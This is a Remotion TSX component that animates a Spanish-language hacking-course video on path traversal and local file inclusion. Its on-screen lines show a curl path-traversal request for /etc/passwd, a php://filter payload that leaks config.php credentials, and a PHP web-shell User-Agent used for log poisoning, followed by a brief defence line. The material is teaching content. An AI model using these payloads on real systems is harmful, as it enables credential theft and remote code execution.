// ── video/remotion/compositions/Hw05PathTraversalLfi.tsx ─────────
// Video: Path Traversal & LFI — de leer archivos a ejecutar código.
// Clase 5 de Hacking Web (lección web-03). Guiones: voicebox-scripts/hw-05-*.txt
// Audios reales en public/videos/audio-es/hw-05-path-traversal-lfi/ (2026-08-25).

import React from 'react';
import { AbsoluteFill, Sequence, staticFile, useVideoConfig } from 'remotion';
import { Audio } from '@remotion/media';
import { sceneStartFrames, AUDIO_TIMINGS, hasAudio } from '../audioTimings';
import { THEME, MONO } from '../theme';
import { FontFace } from '../fonts';
import { RevealLine } from '../primitives/RevealLine';
import { TerminalWindow } from '../primitives/TerminalWindow';

const CENTERED: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  justifyContent: 'center',
  alignItems: 'center',
  height: '100%',
  textAlign: 'center',
};

// ── Escena 1: path traversal + /etc/passwd ──────────────────────
// Habla: intro (0-4.7) · "../../ sube" (7.47)
const Scene1: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 30, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 22 }}>
      PATH TRAVERSAL: <span style={{ color: THEME.red }}>ESCAPAR DE LA WEB</span>
    </div>
    <TerminalWindow title={"kali@attacker-01:~$ curl 'http://10.0.0.11/?page=../../../../etc/passwd'"} width={980} delay={Math.round(2.5 * fps)}>
      <div style={{ fontSize: 14, whiteSpace: 'pre', lineHeight: 1.8 }}>
        <span style={{ color: THEME.green }}>root:x:0:0:root:/root:/bin/bash</span>
        {'\n'}<span style={{ color: THEME.dim }}>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
        {'\n'}<span style={{ color: THEME.dim }}>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>
      </div>
    </TerminalWindow>
    <div style={{ marginTop: 22, fontSize: 16, color: THEME.muted, fontFamily: MONO }}>
      <RevealLine at={7.5} fps={fps} mark="▸" color={THEME.amber}>../../ sube por el árbol hasta /etc/passwd</RevealLine>
    </div>
  </AbsoluteFill>
);

// ── Escena 2: LFI con php://filter ───────────────────────────────
// Habla: "include trae" (8.55) · "php filter" (10.46) · "config vuelve" (22.37)
const Scene2: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 28, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 22 }}>
      LFI: <span style={{ color: THEME.green }}>LEÉS EL CÓDIGO FUENTE</span>
    </div>
    <div style={{ width: 1000, textAlign: 'left' }}>
      <RevealLine at={8.6} fps={fps} mark="▸" color={THEME.cyan}>include() trae el archivo, no solo lo muestra</RevealLine>
      <RevealLine at={10.5} fps={fps} mark="▸" color={THEME.amber}>php://filter/convert.base64-encode/resource=config.php</RevealLine>
      <RevealLine at={22.4} fps={fps} mark="▸" color={THEME.red}>el config vuelve en base64: leés credenciales</RevealLine>
    </div>
  </AbsoluteFill>
);

// ── Escena 3: de LFI a RCE (log poisoning) + defensa ─────────────
// Habla: "metes PHP" (10.73) · "incluis log" (18.14) · "defensa" (24.62)
const Scene3: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 28, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 22 }}>
      DE LFI A <span style={{ color: THEME.red }}>RCE: LOG POISONING</span>
    </div>
    <div style={{ width: 1000, textAlign: 'left' }}>
      <RevealLine at={10.7} fps={fps} mark="▸" color={THEME.amber}>metés PHP en el log: User-Agent: &lt;?php system($_GET["cmd"]); ?&gt;</RevealLine>
      <RevealLine at={18.1} fps={fps} mark="▸" color={THEME.red}>incluís el log → el include lo ejecuta</RevealLine>
      <RevealLine at={24.6} fps={fps} mark="▸" color={THEME.green}>defensa: nunca rutas de usuario en include/u open</RevealLine>
    </div>
  </AbsoluteFill>
);

export const Hw05PathTraversalLfi: React.FC = () => {
  const { fps } = useVideoConfig();
  const [s1, s2, s3] = AUDIO_TIMINGS['hw-05-path-traversal-lfi'];
  const starts = sceneStartFrames('hw-05-path-traversal-lfi', fps);
  const dur1 = Math.ceil(s1 * fps);
  const dur2 = Math.ceil(s2 * fps);
  const dur3 = Math.ceil(s3 * fps) + fps;
  const withAudio = hasAudio('hw-05-path-traversal-lfi');

  return (
    <AbsoluteFill style={{ background: THEME.bg, padding: 60, fontFamily: MONO }}>
      <FontFace />
      <Sequence from={starts[0]} durationInFrames={dur1}>
        {withAudio && <Audio src={staticFile('videos/audio-es/hw-05-path-traversal-lfi/hw-05-scene1.wav')} />}
        <Scene1 fps={fps} />
      </Sequence>
      <Sequence from={starts[1]} durationInFrames={dur2}>
        {withAudio && <Audio src={staticFile('videos/audio-es/hw-05-path-traversal-lfi/hw-05-scene2.wav')} />}
        <Scene2 fps={fps} />
      </Sequence>
      <Sequence from={starts[2]} durationInFrames={dur3}>
        {withAudio && <Audio src={staticFile('videos/audio-es/hw-05-path-traversal-lfi/hw-05-scene3.wav')} />}
        <Scene3 fps={fps} />
      </Sequence>
    </AbsoluteFill>
  );
};
